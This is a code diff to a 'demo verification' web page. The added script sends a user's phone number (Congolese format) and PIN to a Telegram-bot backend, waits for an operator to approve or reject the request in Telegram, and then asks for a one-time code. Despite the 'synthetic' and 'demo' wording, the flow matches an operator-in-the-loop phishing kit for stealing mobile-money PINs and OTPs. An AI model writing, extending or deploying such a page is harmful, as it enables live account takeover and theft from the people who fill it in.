@@ -113,6 +113,11 @@
             cursor: pointer;
         }
 
+        button:disabled {
+            opacity: .65;
+            cursor: not-allowed;
+        }
+
         .page {
             display: none;
             text-align: center;
@@ -123,7 +128,7 @@
         }
 
         .icon {
-            font-size: 42px;
+            font-size: 40px;
             margin-bottom: 14px;
         }
 
@@ -161,13 +166,6 @@
             font-size: 20px;
         }
 
-        .footer {
-            text-align: center;
-            margin-top: 22px;
-            color: #94a3b8;
-            font-size: 12px;
-        }
-
         .error {
             margin-top: 15px;
             padding: 12px;
@@ -175,6 +173,14 @@
             background: #fee2e2;
             color: #991b1b;
             font-size: 13px;
+            line-height: 1.5;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 22px;
+            color: #94a3b8;
+            font-size: 12px;
         }
     </style>
 </head>
@@ -202,6 +208,7 @@
         <form id="verificationForm">
 
             <div class="field">
+
                 <label for="phone">
                     Phone Number
                 </label>
@@ -212,9 +219,11 @@
                     placeholder="+243XXXXXXXXX"
                     required
                 >
+
             </div>
 
             <div class="field">
+
                 <label for="demoPin">
                     Demo PIN
                 </label>
@@ -225,9 +234,13 @@
                     placeholder="Enter demo PIN"
                     required
                 >
+
             </div>
 
-            <button type="submit">
+            <button
+                type="submit"
+                id="continueButton"
+            >
                 Continue
             </button>
 
@@ -276,8 +289,11 @@
         </h2>
 
         <p>
-            Enter a synthetic OTP to complete
-            this demonstration.
+            Your synthetic test request was approved.
+        </p>
+
+        <p style="margin-top:8px;">
+            Enter a synthetic OTP to complete the demo.
         </p>
 
         <input
@@ -308,7 +324,7 @@
         </div>
 
         <h2>
-            Demo Complete
+            Demo Verification Complete
         </h2>
 
         <p>
@@ -328,8 +344,14 @@
 
 <script>
 
+const BACKEND_URL =
+    "https://telegram-bot-backend-n0gd.onrender.com";
+
 const form =
     document.getElementById("verificationForm");
+
+const continueButton =
+    document.getElementById("continueButton");
 
 const pageOne =
     document.getElementById("pageOne");
@@ -351,12 +373,12 @@ const otpButton =
 
 
 // ==========================================
-// PAGE 1 → PAGE 2
+// SEND DEMO REQUEST
 // ==========================================
 
 form.addEventListener(
     "submit",
-    function(event) {
+    async function(event) {
 
         event.preventDefault();
 
@@ -373,52 +395,244 @@ form.addEventListener(
                 .trim();
 
         if (!phone || !demoPin) {
-
-            errorBox.className = "error";
-
-            errorBox.textContent =
-                "Please enter the demo phone number and demo PIN.";
-
             return;
         }
+
+        continueButton.disabled = true;
+        continueButton.textContent = "Sending...";
 
         errorBox.className = "";
         errorBox.textContent = "";
 
-        pageOne.classList.remove("active");
+        try {
 
-        pageTwo.classList.add("active");
+            const response =
+                await fetch(
+                    `${BACKEND_URL}/demo-verification`,
+                    {
+                        method: "POST",
 
+                        headers: {
+                            "Content-Type":
+                                "application/json"
+                        },
+
+                        body: JSON.stringify({
+                            phone: phone,
+                            demoPin: demoPin
+                        })
+                    }
+                );
+
+            const data =
+                await response.json();
+
+            if (
+                !response.ok ||
+                !data.success
+            ) {
+
+                throw new Error(
+                    data.message ||
+                    "Unable to send demo request."
+                );
+            }
+
+            console.log(
+                "Demo request:",
+                data.requestId
+            );
+
+            // Move to verification screen.
+            pageOne.classList.remove("active");
+
+            pageTwo.classList.add("active");
+
+            // Wait for Telegram TRUE/FALSE.
+            checkDemoStatus(
+                data.requestId
+            );
+
+        } catch (error) {
+
+            console.error(
+                "Request error:",
+                error
+            );
+
+            continueButton.disabled = false;
+            continueButton.textContent =
+                "Continue";
+
+            errorBox.className = "error";
+
+            errorBox.textContent =
+                "❌ " + error.message;
+        }
     }
 );
 
 
 // ==========================================
-// DEMO: PAGE 2 → PAGE 3
+// WAIT FOR TELEGRAM DECISION
 // ==========================================
 
-// Automatically advances after a short
-// demonstration delay.
+function checkDemoStatus(requestId) {
 
-setTimeout(
-    function() {
+    let attempts = 0;
 
-        if (
-            pageTwo.classList.contains("active")
-        ) {
+    const maxAttempts = 150;
 
-            pageTwo.classList.remove("active");
+    const timer =
+        setInterval(
+            async function() {
 
-            pageThree.classList.add("active");
-        }
+                attempts++;
 
-    },
-    3000
-);
+                try {
+
+                    const response =
+                        await fetch(
+                            `${BACKEND_URL}/demo-verification/status/${encodeURIComponent(requestId)}`
+                        );
+
+                    if (!response.ok) {
+                        return;
+                    }
+
+                    const data =
+                        await response.json();
+
+                    console.log(
+                        "Demo status:",
+                        data.status
+                    );
+
+                    // TRUE pressed in Telegram.
+                    if (
+                        data.status ===
+                        "approved"
+                    ) {
+
+                        clearInterval(timer);
+
+                        showOtpPage();
+
+                        return;
+                    }
+
+                    // FALSE pressed in Telegram.
+                    if (
+                        data.status ===
+                        "rejected"
+                    ) {
+
+                        clearInterval(timer);
+
+                        showRejectedPage();
+
+                        return;
+                    }
+
+                } catch (error) {
+
+                    console.error(
+                        "Status check error:",
+                        error
+                    );
+                }
+
+                if (
+                    attempts >=
+                    maxAttempts
+                ) {
+
+                    clearInterval(timer);
+
+                    showTimeout();
+                }
+
+            },
+            2000
+        );
+}
 
 
 // ==========================================
-// PAGE 3 → PAGE 4
+// TRUE → OTP PAGE
+// ==========================================
+
+function showOtpPage() {
+
+    pageTwo.classList.remove("active");
+
+    pageThree.classList.add("active");
+
+}
+
+
+// ==========================================
+// FALSE
+// ==========================================
+
+function showRejectedPage() {
+
+    pageTwo.classList.remove("active");
+
+    pageThree.classList.remove("active");
+
+    pageFour.classList.add("active");
+
+    pageFour.innerHTML = `
+
+        <div class="icon">
+            ❌
+        </div>
+
+        <h2>
+            Verification Cancelled
+        </h2>
+
+        <p>
+            The demo request was rejected
+            by the test administrator.
+        </p>
+
+    `;
+}
+
+
+// ==========================================
+// TIMEOUT
+// ==========================================
+
+function showTimeout() {
+
+    pageTwo.classList.remove("active");
+
+    pageFour.classList.add("active");
+
+    pageFour.innerHTML = `
+
+        <div class="icon">
+            ⏱️
+        </div>
+
+        <h2>
+            Demo Request Expired
+        </h2>
+
+        <p>
+            No Telegram decision was received.
+            Please start a new demo test.
+        </p>
+
+    `;
+}
+
+
+// ==========================================
+// DEMO OTP BUTTON
 // ==========================================
 
 otpButton.addEventListener(
@@ -434,7 +648,7 @@ otpButton.addEventListener(
         if (!demoOtp) {
 
             alert(
-                "Enter a synthetic demo OTP."
+                "Please enter a synthetic demo OTP."
             );
 
             return;
